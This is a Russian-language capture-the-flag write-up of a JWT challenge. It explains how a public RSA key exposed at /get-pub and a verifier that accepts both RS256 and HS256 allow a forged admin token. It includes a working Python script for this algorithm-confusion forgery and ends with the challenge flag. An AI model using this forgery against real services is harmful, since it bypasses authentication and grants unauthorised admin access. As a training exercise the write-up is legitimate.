# Момент с JWT writeup
При переходе по ссылке нас встречает некий скрипт, очень похожий на предыдущее задание.

![image](https://user-images.githubusercontent.com/115101419/236475976-399203df-68cf-4556-a7fa-eac08f9e96b7.png)

Такая же директория /gen-jwt, /check-jwt
Но ко всему прочему добавилась директория /get-pub
При переходе по ней мы видим публичный RSA key

![image](https://user-images.githubusercontent.com/115101419/236477058-259ed443-aa60-4a3f-82e0-1f054cb4fdad.png)

Заметим, что в ключе присутствую символы переноса строки \n. 
Запишем ключ в блокнот в правильном виде (заменяя \n на перенос строки соответственно)

![image](https://user-images.githubusercontent.com/115101419/236477627-a4b6c8df-bd7b-40e5-8096-1c87051040f5.png)

Ко всему прочему заметим, что в функции проверки токена алгоритм шифрования может быть как RS256
так и HS256. Также у нас есть хинт
![image](https://user-images.githubusercontent.com/115101419/236483479-c4c180e6-2d36-4b49-9fc8-f85909a9f3a1.png)

Немного погуглив понимаем, что тут можно сделать подделку подписи

![image](https://user-images.githubusercontent.com/115101419/236484417-44c77239-23e9-4b15-8c55-4b7e03ec29e8.png)

Пишем скрипт на питоне. В заголовке меняем алгоритм шифрования на HS256
и поле isAdmin на true. Далее преобразуем их в json вид и кодируем в base64. После вызываем hmac.new() и хэшируем наш пэйлоад с помощью публичного ключа 
и sha256. Потом опять кодируем в base64 и добавляем к jwt токену
```python
import hmac
import json
import base64
import hashlib
with open(r"pubkeyjwt.txt") as file:
    public_key=file.read()

header= {"typ": "JWT", "alg": "HS256"}
payload = {"name": "admin", "isAdmin": True}
json_header=json.dumps(header).encode()
json_payload=json.dumps(payload).encode()
jwt_parts=[]
jwt_parts.append(base64.urlsafe_b64encode(json_header))
jwt_parts.append(base64.urlsafe_b64encode(json_payload))
jwt_payoad=b'.'.join(jwt_parts)
print(jwt_payoad, " <-- пэйлоад без подписи")
signature = hmac.new(public_key.encode(), jwt_payoad, hashlib.sha256).digest()
jwt_parts.append(base64.urlsafe_b64encode(signature))
jwt_payoad=b'.'.join(jwt_parts)
print(jwt_payoad)
```

Результат: 

![image](https://user-images.githubusercontent.com/115101419/236490006-3f52a1b3-24f7-4bef-82e2-0599b9d63ccf.png)

Вставляем токен и надеемся на результат :smiley:

![image](https://user-images.githubusercontent.com/115101419/236490318-1d1282d4-03a1-4bcd-a497-83660aa16ea0.png)

Победа :fire:

**CODEBY{JWT_SUP333R_ULTR444_PR000}**




